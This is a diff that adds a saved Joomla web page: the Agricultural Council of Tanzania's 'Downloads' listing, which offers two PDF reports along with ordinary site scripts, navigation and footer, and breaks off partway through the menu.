@@ -1,0 +1,418 @@
+
+<!doctype html>
+<html prefix="og: http://ogp.me/ns#" lang="en-gb" dir="ltr">
+    <head>
+        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+        <link rel="canonical" href="https://actanzania.or.tz/index.php/act-news-media/downloads">
+        <meta charset="utf-8" />
+	<base href="https://actanzania.or.tz/index.php/act-news-media/downloads" />
+	<meta name="generator" content="Joomla! - Open Source Content Management" />
+	<title>Downloads</title>
+	<link href="/images/webfavicon.png" rel="shortcut icon" type="image/vnd.microsoft.icon" />
+	<link href="https://cdnjs.cloudflare.com/ajax/libs/simple-line-icons/2.4.1/css/simple-line-icons.min.css" rel="stylesheet" />
+	<link href="/components/com_k2/css/k2.css?v=2.9.0" rel="stylesheet" />
+	<link href="https://actanzania.or.tz/components/com_dropfiles/assets/css/front_ver5.4.css" rel="stylesheet" />
+	<link href="https://actanzania.or.tz/components/com_dropfiles/assets/css/video-js.css" rel="stylesheet" />
+	<link href="/components/com_dropfiles/assets/css/jaofoldertree.css" rel="stylesheet" />
+	<link href="/components/com_dropfiles/assets/css/material-design-iconic-font.min.css" rel="stylesheet" />
+	<link href="/plugins/dropfilesthemes/default/style_ver5.4.css" rel="stylesheet" />
+	<link href="/components/com_dropfiles/assets/css/front_ver5.4.css" rel="stylesheet" />
+	<link href="/components/com_dropfiles/assets/css/video-js.css" rel="stylesheet" />
+	<link href="//fonts.googleapis.com/css?family=Muli:100,100i,300,300i,400,400i,500,500i,700,700i,900,900i&amp;subset=vietnamese" rel="stylesheet" />
+	<link href="/templates/sj_wisdom/css/bootstrap.min.css" rel="stylesheet" />
+	<link href="/templates/sj_wisdom/css/owl.carousel.css" rel="stylesheet" />
+	<link href="/templates/sj_wisdom/css/slick.css" rel="stylesheet" />
+	<link href="/templates/sj_wisdom/css/font-awesome.min.css" rel="stylesheet" />
+	<link href="/templates/sj_wisdom/css/template.css" rel="stylesheet" />
+	<link href="/templates/sj_wisdom/css/presets/preset2.css" rel="stylesheet" />
+	<link href="/templates/sj_wisdom/css/custom.css" rel="stylesheet" />
+	<link href="/plugins/system/ytshortcodes/assets/css/shortcodes.css" rel="stylesheet" />
+	<link href="https://actanzania.or.tz/plugins/system/ytshortcodes/assets/css/font-awesome.min.css" rel="stylesheet" />
+	<link href="/media/system/css/modal.css?81db36ffe2c0111b9e92ece2ca0f866e" rel="stylesheet" />
+	<style>
+.dropfiles-content-default[data-category="33"] .dropfiles_list .file,.dropfiles-content.dropfiles-content-default[data-category="33"] .dropfilescategory:not(.backcategory), .dropfiles-content.dropfiles-content-default[data-category="33"] .dropfilescategory_placeholder {margin : 10px 10px 10px 10px !important;}.dropfiles-content-default[data-category="33"] .dropfiles_list .file {flex-basis: calc(50% - 20px);max-width: calc(50% - 20px);}@media only screen and (max-width: 900px) {.dropfiles-content-default[data-category="33"] .dropfiles_list .file {flex-basis: calc(100% - 20px);max-width: calc(100% - 20px);}} .dropfiles-content-default[data-category="33"] .file .downloadlink, .dropfiles-content-default[data-category="33"] .download-all, .dropfiles-content-default[data-category="33"] .download-selected {background-color:#76bc58 !important;color:#ffffff !important;}body{font-family: 'Muli', sans-serif;font-size: 15px;font-weight: 300;}
+.logo-image {height:106px;}.logo-image-phone {height:106px;}#sp-top{ background-color:#67af42;padding:0px 20px 0px 220px; }#sp-top a{color:#ffffff;}#sp-top a:hover{color:#000000;}#sp-header{ padding:0px 50px 0px 0px; }#sp-footer{ background-image:url("/images/bg-footer.png");background-repeat:no-repeat;background-size:cover;background-attachment:inherit;background-position:50% 50%;color:#ffffff; }
+	</style>
+	<script type="application/json" class="joomla-script-options new">{"csrf.token":"00d653b84d23898f4b46e08d30bebb6a","system.paths":{"root":"","base":""},"joomla.jtext":{"COM_DROPFILES_DOWNLOAD_ALL":"Download all","COM_DROPFILES_DOWNLOAD_SELECTED":"Download selected","COM_DROPFILES_FIELD_FILE_BYTE":"B","COM_DROPFILES_FIELD_FILE_KILOBYTE":"KB","COM_DROPFILES_FIELD_FILE_MEGABYTE":"MB","COM_DROPFILES_FIELD_FILE_GIGABYTE":"GB","COM_DROPFILES_FIELD_FILE_TERRABYTE":"TB","COM_DROPFILES_FIELD_FILE_PETABYTE":"PB","COM_DROPFILES_LIGHT_BOX_LOADING_STATUS":"The preview is still loading, you can <span class=dropfiles-loading-close>cancel<\/span> it at any time..."}}</script>
+	<script src="/media/jui/js/jquery.min.js?81db36ffe2c0111b9e92ece2ca0f866e"></script>
+	<script src="/media/jui/js/jquery-noconflict.js?81db36ffe2c0111b9e92ece2ca0f866e"></script>
+	<script src="/media/jui/js/jquery-migrate.min.js?81db36ffe2c0111b9e92ece2ca0f866e"></script>
+	<script src="/media/k2/assets/js/k2.frontend.js?v=2.9.0&amp;sitepath=/"></script>
+	<script src="/media/system/js/core.js?81db36ffe2c0111b9e92ece2ca0f866e"></script>
+	<script src="/media/system/js/mootools-core.js?81db36ffe2c0111b9e92ece2ca0f866e"></script>
+	<script src="/media/system/js/mootools-more.js?81db36ffe2c0111b9e92ece2ca0f866e"></script>
+	<script src="https://actanzania.or.tz/components/com_dropfiles/assets/js/video.js"></script>
+	<script src="/components/com_dropfiles/assets/js/frontend.js"></script>
+	<script src="/components/com_dropfiles/assets/js/handlebars-v4.7.7.js"></script>
+	<script src="/components/com_dropfiles/assets/js/jaofoldertree.js"></script>
+	<script src="/components/com_dropfiles/assets/js/colorbox.init.js"></script>
+	<script src="/plugins/dropfilesthemes/default/js/script.js"></script>
+	<script src="https://actanzania.or.tz/components/com_dropfiles/assets/js/helper.js"></script>
+	<script src="/components/com_dropfiles/assets/js/video.js"></script>
+	<script src="/templates/sj_wisdom/js/popper.min.js"></script>
+	<script src="/templates/sj_wisdom/js/bootstrap.min.js"></script>
+	<script src="/templates/sj_wisdom/js/owl.carousel.js"></script>
+	<script src="/templates/sj_wisdom/js/slick.min.js"></script>
+	<script src="/templates/sj_wisdom/js/main.js"></script>
+	<script src="https://actanzania.or.tz/plugins/system/ytshortcodes/assets/js/prettify.js"></script>
+	<script src="https://actanzania.or.tz/plugins/system/ytshortcodes/assets/js/shortcodes.js"></script>
+	<script src="/media/system/js/modal.js?81db36ffe2c0111b9e92ece2ca0f866e"></script>
+	<script>
+dropfilesBaseUrl="https://actanzania.or.tz/";jQuery(document).ready(function(){ jQuery("body").append("<div id='dropfiles-loading-wrap'><div class='dropfiles-loading'></div></div><div id='dropfiles-loading-tree-wrap'><div class='dropfiles-loading-tree-bg'></div></div>")});dropfilesBaseUrl="https://actanzania.or.tz/";dropfilesRootUrl="/";template="sj_wisdom";
+		jQuery(function($) {
+			SqueezeBox.initialize({});
+			initSqueezeBox();
+			$(document).on('subform-row-add', initSqueezeBox);
+
+			function initSqueezeBox(event, container)
+			{
+				SqueezeBox.assign($(container || document).find('a.modal').get(), {
+					parse: 'rel'
+				});
+			}
+		});
+
+		window.jModalClose = function () {
+			SqueezeBox.close();
+		};
+
+		// Add extra modal close functionality for tinyMCE-based editors
+		document.onreadystatechange = function () {
+			if (document.readyState == 'interactive' && typeof tinyMCE != 'undefined' && tinyMCE)
+			{
+				if (typeof window.jModalClose_no_tinyMCE === 'undefined')
+				{
+					window.jModalClose_no_tinyMCE = typeof(jModalClose) == 'function'  ?  jModalClose  :  false;
+
+					jModalClose = function () {
+						if (window.jModalClose_no_tinyMCE) window.jModalClose_no_tinyMCE.apply(this, arguments);
+						tinyMCE.activeEditor.windowManager.close();
+					};
+				}
+
+				if (typeof window.SqueezeBoxClose_no_tinyMCE === 'undefined')
+				{
+					if (typeof(SqueezeBox) == 'undefined')  SqueezeBox = {};
+					window.SqueezeBoxClose_no_tinyMCE = typeof(SqueezeBox.close) == 'function'  ?  SqueezeBox.close  :  false;
+
+					SqueezeBox.close = function () {
+						if (window.SqueezeBoxClose_no_tinyMCE)  window.SqueezeBoxClose_no_tinyMCE.apply(this, arguments);
+						tinyMCE.activeEditor.windowManager.close();
+					};
+				}
+			}
+		};
+		
+	</script>
+    </head>
+   <body class="site helix-ultimate com-dropfiles view-frontlist layout-default task-none itemid-345 en-gb ltr sticky-header layout-fluid offcanvas-init offcanvs-position-right">
+    
+    <div class="body-wrapper">
+        <div class="body-innerwrapper">
+                        <section id="sp-top"><div class="row"><div id="sp-top1" class="col-lg-6 "><div class="sp-column "><ul class="social-icons"><li class="social-icon-facebook"><a target="_blank" href="https://www.facebook.com/actanzania/" aria-label="facebook"><span class="fa fa-facebook" aria-hidden="true"></span></a></li><li class="social-icon-twitter"><a target="_blank" href="https://twitter.com/act_tz" aria-label="twitter"><span class="fa fa-twitter" aria-hidden="true"></span></a></li><li><a target="_blank" href="https://www.youtube.com/channel/UCajKr0djTYvvauCPahLLAJg" aria-label="Youtube"><span class="fa fa-youtube" aria-hidden="true"></span></a></li><li class="social-icon-linkedin"><a target="_blank" href="https://www.linkedin.com/in/baraza-la-kilimo-act-a56803214/" aria-label="LinkedIn"><span class="fa fa-linkedin" aria-hidden="true"></span></a></li><li class="social-icon-instagram"><a target="_blank" href="https://www.instagram.com/barazalakilimotanzania/" aria-label="Instagram"><span class="fa fa-instagram" aria-hidden="true"></span></a></li><li class="social-icon-whatsapp"><a href="whatsapp://send?abid=#&text=Hi" aria-label="WhatsApp"><span class="fa fa-whatsapp" aria-hidden="true"></span></a></li></ul></div></div><div id="sp-top2" class="col-lg-6 d-none d-sm-none d-md-none d-lg-none d-xl-block"><div class="sp-column "><ul class="sp-contact-info"><li class="sp-contact-phone"><span class="fa fa-phone" aria-hidden="true"></span> <a href="tel:+255719260726">+255 719 260 726</a></li><li class="sp-contact-email"><span class="fa fa-envelope" aria-hidden="true"></span> <a href="mailto:act@actanzania.or.tz">act@actanzania.or.tz</a></li><li class="sp-contact-time"><span class="fa fa-building" aria-hidden="true"></span> <a href="https://www.actanzania.or.tz/index.php/contact" target="_tab">Mon -Fri: 08:00 - 16:30</a></li></ul></div></div></div></section><header id="sp-header"><div class="row"><div id="sp-logo" class="col-lg-2 "><div class="sp-column "><div class="logo"><a href="/"><img class="logo-image d-none d-lg-inline-block" src="/images/officialweblogo.jpg" alt="Agricultural Council Of Tanzania- ACT"><img class="logo-image-phone d-inline-block d-lg-none" src="/images/officialweblogo.jpg" alt="Agricultural Council Of Tanzania- ACT"></a></div></div></div><div id="sp-menu" class="col-lg-10 "><div class="sp-column "><nav class="sp-megamenu-wrapper" role="navigation"><a id="offcanvas-toggler" aria-label="Navigation" class="offcanvas-toggler-right" href="#"><i class="fa fa-bars" aria-hidden="true" title="Navigation"></i></a><ul class="sp-megamenu-parent menu-animation-none d-none d-lg-block"><li class="sp-menu-item"><a  href="/index.php" ><span class="fa fa-home"></span></a></li><li class="sp-menu-item sp-has-child"><a  href="#" >About us</a><div class="sp-dropdown sp-dropdown-main sp-menu-right" style="width: 240px;"><div class="sp-dropdown-inner"><ul class="sp-dropdown-items"><li class="sp-menu-item"><a  href="/index.php/about/who-we-are" >Who we are</a></li><li class="sp-menu-item"><a  href="/index.php/about/what-we-do" >What we do</a></li><li class="sp-menu-item"><a  href="/index.php/about/strategic-objectives" >Strategic Objectives</a></li><li class="sp-menu-item"><a  href="/index.php/about/act-high-five" >ACT High Five</a></li><li class="sp-menu-item"><a  href="/index.php/about/act-secretariat-staff" >ACT Secretariat Staff </a></li><li class="sp-menu-item"><a  href="/index.php/about/strategic-partners" >Strategic Partners</a></li></ul></div></div></li><li class="sp-menu-item sp-has-child"><a  href="/index.php/achievements" >Achievements</a><div class="sp-dropdown sp-dropdown-main sp-menu-right" style="width: 240px;"><div class="sp-dropdown-inner"><ul class="sp-dropdown-items"><li class="sp-menu-item sp-has-child"><a  href="#" >Programs &amp; Projects</a><div class="sp-dropdown sp-dropdown-sub sp-menu-right" style="width: 240px;"><div class="sp-dropdown-inner"><ul class="sp-dropdown-items"><li class="sp-menu-item"><a  href="/index.php/achievements/programs-projects/current-projects" >Current Projects</a></li><li class="sp-menu-item"><a  href="/index.php/achievements/programs-projects/successfully-projects" >Successfully Projects</a></li></ul></div></div></li><li class="sp-menu-item"><a  href="/index.php/achievements/policy-and-advocacy" >Policy and Advocacy</a></li><li class="sp-menu-item"><a  href="/index.php/achievements/women-and-youth-inclusivity" >Women and Youth Inclusivity</a></li><li class="sp-menu-item"><a  href="/index.php/achievements/environmental-sustainability" >Environmental Sustainability</a></li></ul></div></div></li><li class="sp-menu-item sp-has-child"><a  href="#" >ACT Mandate</a><div class="sp-dropdown sp-dropdown-main sp-menu-right" style="width: 240px;"><div class="sp-dropdown-inner"><ul class="sp-dropdown-items"><li class="sp-menu-item"><a  href="/index.php/act-mandate/lobbying-advocacy" >Lobbying &amp; Advocacy</a></li></ul></div></div></li><li class="sp-menu-item sp-has-child"><a  href="#" >Membership &amp; Services</a><div class="sp-dropdown sp-dropdown-main sp-menu-right" style="width: 240px;"><div class="sp-dropdown-inner"><ul class="sp-dropdown-items"><li class="sp-menu-item"><a  href="/index.php/membership-services/membership-application-process" >Membership Application Process</a></li><li class="sp-menu-item"><a  href="/index.php/membership-services/membership-category" >Membership Category</a></li><li class="sp-menu-item"><a  href="/index.php/membership-services/membership-benefits" >Membership Benefits</a></li><li class="sp-menu-item"><a  href="/index.php/membership-services/our-members" >Our Members</a></li><li class="sp-menu-item"><a  href="/index.php/membership-services/events" >Events</a></li></ul></div></div></li><li class="sp-menu-item sp-has-child"><a  href="#" >Resources</a><div class="sp-dropdown sp-dropdown-main sp-menu-right" style="width: 240px;"><div class="sp-dropdown-inner"><ul class="sp-dropdown-items"><li class="sp-menu-item"><a  href="/index.php/all-resources/all-act-newsletters" >Newsletters</a></li><li class="sp-menu-item"><a  href="/index.php/all-resources/all-publications" >Publications</a></li><li class="sp-menu-item"><a  href="/index.php/all-resources/brochures" >Brochures</a></li><li class="sp-menu-item"><a  href="/index.php/all-resources/reports" >Reports</a></li><li class="sp-menu-item"><a  href="/index.php/all-resources/all-research-papers" >Research Papers</a></li><li class="sp-menu-item"><a  href="/index.php/all-resources/strategic-plan" >Strategic Plan</a></li><li class="sp-menu-item"><a  href="/index.php/all-resources/policy-briefs" >Policy Briefs</a></li><li class="sp-menu-item"><a  href="/index.php/all-resources/data-and-information" >Data and Information</a></li></ul></div></div></li><li class="sp-menu-item sp-has-child"><a  href="#" >E-Services</a><div class="sp-dropdown sp-dropdown-main sp-menu-right" style="width: 240px;"><div class="sp-dropdown-inner"><ul class="sp-dropdown-items"><li class="sp-menu-item"><a  href="/index.php/e-services/e-commerce" >E-Commerce</a></li><li class="sp-menu-item"><a  href="https://www.actanzania.or.tz:2096/" target="_blank" >Staff E-mail Login</a></li></ul></div></div></li><li class="sp-menu-item sp-has-child active"><a  href="/index.php/act-news-media" >Media</a><div class="sp-dropdown sp-dropdown-main sp-menu-right" style="width: 240px;"><div class="sp-dropdown-inner"><ul class="sp-dropdown-items"><li class="sp-menu-item"><a  href="/index.php/act-news-media/advertisements" >Advertisements</a></li><li class="sp-menu-item"><a  href="/index.php/act-news-media/upcoming-events" >Events</a></li><li class="sp-menu-item"><a  href="/index.php/act-news-media/act-calendar" >Events Calendar</a></li><li class="sp-menu-item"><a  href="/index.php/act-news-media/opportunities" >Opportunities</a></li><li class="sp-menu-item"><a  href="/index.php/act-news-media/all-careers" >Careers</a></li><li class="sp-menu-item current-item active"><a  href="/index.php/act-news-media/downloads" >Downloads</a></li><li class="sp-menu-item"><a  href="/index.php/act-news-media/act-gallery" >Gallery</a></li></ul></div></div></li><li class="sp-menu-item"><a  href="/index.php/contact" >Contact</a></li><li class="sp-menu-item"><a class="btn btn-top" href="/index.php/donate" >Donate</a></li></ul></nav></div></div></div></header><section id="sp-title"><div class="container"><div class="container-inner"><div class="row"><div id="sp-breadcrumb" class="col-lg-12 "><div class="sp-column "><div class="sp-module "><div class="sp-module-content">
+<ol itemscope itemtype="https://schema.org/BreadcrumbList" class="breadcrumb">
+			<li class="float-left">
+			<span class="divider fa fa-location" aria-hidden="true"></span>
+		</li>
+	
+				<li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem" class="breadcrumb-item"><a itemprop="item" href="/index.php" class="pathway"><span itemprop="name">Home</span></a>				<meta itemprop="position" content="1">
+			</li>
+					<li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem" class="breadcrumb-item"><a itemprop="item" href="/index.php/act-news-media" class="pathway"><span itemprop="name">Media</span></a>				<meta itemprop="position" content="2">
+			</li>
+					<li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem" class="breadcrumb-item active"><span itemprop="name">Downloads</span>				<meta itemprop="position" content="3">
+			</li>
+		</ol>
+</div></div></div></div></div></div></div></section><section id="sp-main-body"><div class="container"><div class="container-inner"><div class="row"><div id="sp-component" class="col-lg-12 col-xl-9 "><div class="sp-column "><div id="system-message-container">
+	</div>
+
+<div class="dropfiles-page ">
+        <script type="text/x-handlebars-template" id="dropfiles-template-default-categories-33">
+        <div class="dropfiles-categories">
+                            {{#with category}}
+                <div class="categories-head ">
+                    <h2>{{title}}</h2>
+                </div>
+                {{/with}}
+                        {{#if categories}}
+            {{#each categories}}
+            <a class="catlink dropfilescategory" href="#" data-idcat="{{id}}" title="{{title}}">
+                <span>{{title}}</span>
+                <i class="zmdi zmdi-folder dropfiles-folder"></i>
+            </a>
+            {{/each}}
+            {{/if}}
+            {{#with category}}
+            {{#if parent_id}}
+            <a class="catlink dropfilescategory backcategory" href="#" data-idcat="{{parent_id}}"><i
+                        class="zmdi zmdi-chevron-left"></i>Back            </a>
+            {{/if}}
+            {{/with}}
+            <div class="dropfilescategory_placeholder" style="margin-top: 0 !important; margin-bottom: 0 !important;"></div>
+            <div class="dropfilescategory_placeholder" style="margin-top: 0 !important; margin-bottom: 0 !important;"></div>
+            <div class="dropfilescategory_placeholder" style="margin-top: 0 !important; margin-bottom: 0 !important;"></div>
+            <div class="dropfilescategory_placeholder" style="margin-top: 0 !important; margin-bottom: 0 !important;"></div>
+            <div class="dropfilescategory_placeholder" style="margin-top: 0 !important; margin-bottom: 0 !important;"></div>
+            <div class="dropfilescategory_placeholder" style="margin-top: 0 !important; margin-bottom: 0 !important;"></div>
+            <div class="dropfilescategory_placeholder" style="margin-top: 0 !important; margin-bottom: 0 !important;"></div>
+        </div>
+    </script>
+
+
+<script type="text/x-handlebars-template" id="dropfiles-template-default-files-33">
+    {{#if category}}
+    {{#if category.type}}
+    <input type="hidden" id="current-category-type" class="type {{category.type}}" data-category-type="{{category.type}}"/>
+    {{/if}}
+    {{#if category.linkdownload_cat}}
+    <input type="hidden" id="current-category-link" class="link" value="{{category.linkdownload_cat}}"/>
+    {{/if}}
+    {{/if}}
+    {{#if files}}
+    <div class="dropfiles_list">
+        {{#each files}}{{#if ext}}
+        <div class="file">
+            <div class="filecontent">
+                {{#if custom_icon}}
+                <div class="custom-icon {{ext}}"><img src="/{{custom_icon_thumb}}" alt=""/></div>
+                {{else}}
+                <div class="ext {{ext}}"><span class="txt">{{ext}}</span></div>
+                {{/if}}
+                                    <h3>
+                                                <a href="/{{link}}" title="{{title}}">{{title}}</a>
+                    </h3>
+                                <div class="file-xinfo">
+                    {{#if description}}
+                    <div class="file-desc">{{{description}}}</div>
+                    {{/if}}
+                                            {{#if versionNumber}}
+                        <div class="file-version"><span>Version                                : </span> {{versionNumber}}&nbsp;
+                        </div>
+                        {{/if}}
+                                                                {{#if size}}
+                        <div class="file-size"><span>Size                                : </span> {{bytesToSize size}}
+                        </div>
+                        {{/if}}
+                                                                <div class="file-hits"><span>Hits                                : </span> {{hits}}
+                        </div>
+                                                                <div class="file-dated"><span>Date added                                : </span> {{created_time}}
+                        </div>
+                                                        </div>
+            </div>
+            <div class="file-right">
+                                                            <a class="downloadlink"
+                           href="/{{link}}">Download<i
+                                    class="zmdi zmdi-cloud-download dropfiles-download"></i></a>
+                                                                {{#if openpdflink}}
+                        <a href="/{{openpdflink}}"
+                           class="openlink"
+                           target="_blank">Open<i
+                                    class="zmdi zmdi-filter-center-focus dropfiles-preview"></i></a>
+                        {{else}}
+                        {{#if viewerlink}}
+                        <a data-id="{{id}}" data-catid="{{catid}}" data-file-type="{{ext}}"
+                           class="openlink dropfileslightbox"                            href="/{{viewerlink}}">Preview<i
+                                    class="zmdi zmdi-filter-center-focus dropfiles-preview"></i></a>
+                        {{/if}}
+                        {{/if}}
+                                                </div>
+        </div>
+        {{/if}}{{/each}}
+        <div class="file flexspan"></div>
+    </div>
+    {{/if}}
+</script>
+
+    <div class="dropfiles-content dropfiles-content-multi dropfiles-files dropfiles-content-default"
+         data-category="33" data-category-name="Downloads">
+        <input type="hidden" id="current_category" value="33"/>
+        <input type="hidden" id="current_category_slug" value="downloads"/>
+                    <ul class="breadcrumbs dropfiles-breadcrumbs-default">
+                <li class="active">
+                    Downloads                </li>
+                                            </ul>
+                <div class="dropfiles-container">
+                        <div class="dropfiles-container-default ">
+                <div class="dropfiles-categories">
+                    <div class="categories-head">
+                                                    <h2>Downloads</h2>
+                                            </div>
+                                    </div>
+                                    <div class="dropfiles_list">
+                                                                                    <div class="file">
+                                    <div class="filecontent">
+                                                                                    <div class="ext pdf"><span
+                                                        class="txt">pdf</span></div>
+                                                                                                                            <h3>
+                                                                                                <a class="dropfiles_downloadlink" title="Pongezi za Sekta Binafsi"
+                                                   href="https://actanzania.or.tz/index.php/files/33/Downloads/34/Pongezi-za-Sekta-Binafsi.pdf">Pongezi za Sekta Binafsi</a>
+                                            </h3>
+                                                                                <div class="file-xinfo">
+                                            <div class="file-desc"></div>
+                                                                                                                                        <div class="file-size">
+                                                <span>
+                                                    Size:
+                                                </span>
+                                                    115.86 KB                                                </div>
+                                                                                                                                        <div class="file-hits">
+                                                <span>Hits                                                    : </span> 405</div>
+                                                                                                                                        <div class="file-dated">
+                                                <span>
+                                                    Date added:
+                                                </span>
+                                                    2022-05-23                                                </div>
+                                                                                                                                </div>
+                                    </div>
+                                    <div class="file-right">
+                                                                                    <a class="downloadlink" href="https://actanzania.or.tz/index.php/files/33/Downloads/34/Pongezi-za-Sekta-Binafsi.pdf">
+                                                Download                                                <i class="zmdi zmdi-cloud-download dropfiles-download"></i></a>
+                                                                                                                                                                            <a data-id="34"
+                                                   data-catid="33"
+                                                   data-file-type="pdf"
+                                                   class="openlink dropfileslightbox"
+                                                                                                       href="https://docs.google.com/viewer?url=https%3A%2F%2Factanzania.or.tz%2Findex.php%2Ffiles%2F33%2FDownloads%2F34%2FPongezi-za-Sekta-Binafsi.pdf%3Ftoken%3Db3fee49ca11e2e35c0b8b5054d49c074%26preview%3D1&embedded=true">
+                                                    Preview                                                    <i class="zmdi zmdi-filter-center-focus dropfiles-preview"></i>
+                                                </a>
+                                                                                                                        </div>
+                                </div>
+                                                                                                                <div class="file">
+                                    <div class="filecontent">
+                                                                                    <div class="ext pdf"><span
+                                                        class="txt">pdf</span></div>
+                                                                                                                            <h3>
+                                                                                                <a class="dropfiles_downloadlink" title="COP 28, A New Hope for African Countries "
+                                                   href="https://actanzania.or.tz/index.php/files/33/Downloads/53/COP-28-A-New-Hope-for-African-Countries-.pdf">COP 28, A New Hope for African Countries </a>
+                                            </h3>
+                                                                                <div class="file-xinfo">
+                                            <div class="file-desc"></div>
+                                                                                                                                        <div class="file-size">
+                                                <span>
+                                                    Size:
+                                                </span>
+                                                    114.21 KB                                                </div>
+                                                                                                                                        <div class="file-hits">
+                                                <span>Hits                                                    : </span> 163</div>
+                                                                                                                                        <div class="file-dated">
+                                                <span>
+                                                    Date added:
+                                                </span>
+                                                    2023-12-12                                                </div>
+                                                                                                                                </div>
+                                    </div>
+                                    <div class="file-right">
+                                                                                    <a class="downloadlink" href="https://actanzania.or.tz/index.php/files/33/Downloads/53/COP-28-A-New-Hope-for-African-Countries-.pdf">
+                                                Download                                                <i class="zmdi zmdi-cloud-download dropfiles-download"></i></a>
+                                                                                                                                                                            <a data-id="53"
+                                                   data-catid="33"
+                                                   data-file-type="pdf"
+                                                   class="openlink dropfileslightbox"
+                                                                                                       href="https://docs.google.com/viewer?url=https%3A%2F%2Factanzania.or.tz%2Findex.php%2Ffiles%2F33%2FDownloads%2F53%2FCOP-28-A-New-Hope-for-African-Countries-.pdf%3Ftoken%3Db3fee49ca11e2e35c0b8b5054d49c074%26preview%3D1&embedded=true">
+                                                    Preview                                                    <i class="zmdi zmdi-filter-center-focus dropfiles-preview"></i>
+                                                </a>
+                                                                                                                        </div>
+                                </div>
+                                                                            <div class="file flexspan"></div>
+                    </div>
+                            </div>
+        </div>
+    </div>
+
+</div>    
+</div></div></div></div></div></section><footer id="sp-footer"><div class="container"><div class="container-inner"><div class="row"><div id="sp-footer1" class="col-lg-4 "><div class="sp-column "><div class="sp-module "><div class="sp-module-content">
+
+<div class="custom"  >
+	<p align="left"><img src="/images/footerlogo.png" alt="footer" /></p>
+<p><span class="phone">Phone:</span> <a href="tel:+255 22 276 1344"> +255 719 260 726</a></p>
+<p style="margin-bottom: 38px; display: flex;"><span class="address">Address:</span> <a href="/index.php/contact"><span class="address2">Plot no 275, Block 43, House no 12. Mazwile Street Near TRA Office - Mwenge P.O.Box 14130, Dar es Salaam - Tanzania</span></a></p></div>
+</div></div></div></div><div id="sp-feature" class="col-lg-4 "><div class="sp-column "><div class="sp-module "><h3 class="sp-module-title">Useful Links for You</h3><div class="sp-module-content">
+
+<div class="custom"  >
+	<div class="row">
+<div class="col-md-12">
+<ul class="menu" style="list-style-type: square;">
+<li><a href="https://www.kilimo.go.tz/index.php/en">Ministry of Agriculture</a></li>
+<li><a href="https://www.mifugouvuvi.go.tz/">Ministry of Livestock Development and Fisheries</a></li>
+<li><a href="https://www.mit.go.tz/">Ministry of Industry, Trade and Investment</a></li>
+<li><a href="https://www.mof.go.tz/">Ministry of Finance and Planning</a></li>
+<li><a href="https://www.tamisemi.go.tz/">Ofisi ya Raisi - TAMISEMI</a></li>
+</ul>
+</div>
+<!--
+	<div class="col-md-6">
+		<ul class="menu">
+			<li><a href="#">Your Account</a></li>
+			<li><a href="#">Returns Centre</a></li>
+			<li><a href="#">Purchase Protection</a></li>
+			<li><a href="#">Cartbit Download</a></li>
+		</ul>
+	</div>
+--></div></div>
+</div></div></div></div><div id="sp-footer2" class="col-lg-4 "><div class="sp-column "><div class="sp-module "><h3 class="sp-module-title">Get ACT Daily Updates</h3><div class="sp-module-content">This module can not work without the AcyMailing Component</div></div><div class="sp-module "><div class="sp-module-content">
+
+<div class="custom"  >
+	<p><a href="https://www.actanzania.or.tz:2096/" target="_blank" rel="noopener"><img src="/images/staff_email.png" alt="staff email" width="175" height="66" /></a></p></div>
+</div></div><span class="sp-copyright">Copyrights © 2026 Agricultural Council of Tanzania  (ACT). All Rights Reserved. Developed by <a target="_tab" title="Visit Systemax (T) Ltd!" href="https://systemax.co.tz">therealcyber_graphics</a></span></div></div></div></div></div></footer>        </div>
+    </div>
+
+    <!-- Off Canvas Menu -->
+    <div class="offcanvas-overlay"></div>
+    <div class="offcanvas-menu">
+        <a href="#" class="close-offcanvas"><span class="fa fa-remove"></span></a>
+        <div class="offcanvas-inner">
+                            <div class="sp-module _menu"><div class="sp-module-content"><ul class="menu">
+<li class="item-101"><a href="/index.php" >Home</a></li><li class="item-195 menu-deeper menu-parent"><a href="#" >About us<span class="menu-toggler"></span></a><ul class="menu-child"><li class="item-201"><a href="/index.php/about/who-we-are" >Who we are</a></li><li class="item-202"><a href="/index.php/about/what-we-do" >What we do</a></li><li class="item-371"><a href="/index.php/about/strategic-objectives" >Strategic Objectives</a></li><li class="item-365"><a href="/index.php/about/act-high-five" >ACT High Five</a></li><li class="item-205"><a href="/index.php/about/act-secretariat-staff" >ACT Secretariat Staff </a></li><li class="item-206"><a href="/index.php/about/strategic-partners" >Strategic Partners</a></li></ul></li><li class="item-196 menu-deeper menu-parent"><a href="/index.php/achievements" >Achievements<span class="menu-toggler"></span></a><ul class="menu-child"><li class="item-341 menu-deeper menu-parent"><a href="#" >Programs &amp; Projects<span class="menu-toggler"></span></a><ul class="menu-child"><li class="item-225"><a href="/index.php/achievements/programs-projects/current-projects" >Current Projects</a></li><li class="item-342"><a href="/index.php/achievements/programs-projects/successfully-projects" >Successfully Projects</a></li></ul></li><li class="item-366"><a href="/index.php/achievements/policy-and-advocacy" >Policy and Advocacy</a></li><li class="item-367"><a href="/index.php/achievements/women-and-youth-inclusivity" >Women and Youth Inclusivity</a></li><li class="item-368"><a href="/index.php/achievements/environmental-sustainability" >Environmental Sustainability</a></li></ul></li><li class="item-343 menu-deeper menu-parent"><a href="#" >ACT Mandate<span class="menu-toggler"></span></a><ul class="menu-child"><li class="item-209"><a href="/index.php/act-mandate/lobbying-advocacy" >Lobbying &amp; Advocacy</a></li></ul></li><li class="item-197 menu-deeper menu-parent"><a href="#" >Membership &amp; Services<span class="menu-toggler"></span></a><ul class="menu-child"><li class="item-374"><a href="/index.php/membership-services/membership-application-process" >Membership Application Process</a></li><li class="item-220"><a href="/index.php/membership-services/membership-category" >Membership Category</a></li><li class="item-222"><a href="/index.php/membership-services/membership-benefits" >Membership Benefits</a></li><li class="item-223"><a href="/index.php/membership-services/our-members" >Our Members</a></li><li class="item-376"><a href="/index.php/membership-services/events" >Events</a></li></ul></li><li class="item-198 menu-deeper menu-parent"><a href="#" >Resources<span class="menu-toggler"></span></a><ul class="menu-child"><li class="item-352"><a href="/index.php/all-resources/all-act-newsletters" >Newsletters</a></li><li class="item-207"><a href="/index.php/all-resources/all-publications" >Publications</a></li><li class="item-375"><a href="/index.php/all-resources/brochures" >Brochures</a></li><li class="item-208"><a href="/index.php/all-resources/reports" >Reports</a></li><li class="item-210"><a href="/index.php/all-resources/all-research-papers" >Research Papers</a></li><li class="item-351"><a href="/index.php/all-resources/strategic-plan" >Strategic 